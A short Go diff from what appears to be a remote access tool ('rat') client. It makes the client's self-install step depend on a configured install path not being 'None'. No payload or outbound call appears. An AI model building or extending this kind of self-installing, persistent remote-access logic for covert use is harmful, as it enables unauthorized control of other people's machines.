@@ -7,6 +7,7 @@ import (
 	"rat/client/install"
 	"rat/client/startup"
 	"rat/common"
+	"rat/common/installpath"
 	"time"
 )
 
@@ -17,7 +18,7 @@ func main() {
 		return
 	}
 
-	if !install.IsInstalled(Config.Install) {
+	if Config.Install != installpath.None && !install.IsInstalled(Config.Install) {
 		file, err := install.Install(Config.Name, Config.Install)
 		if err != nil {
 			fmt.Println("install:", err.Error())
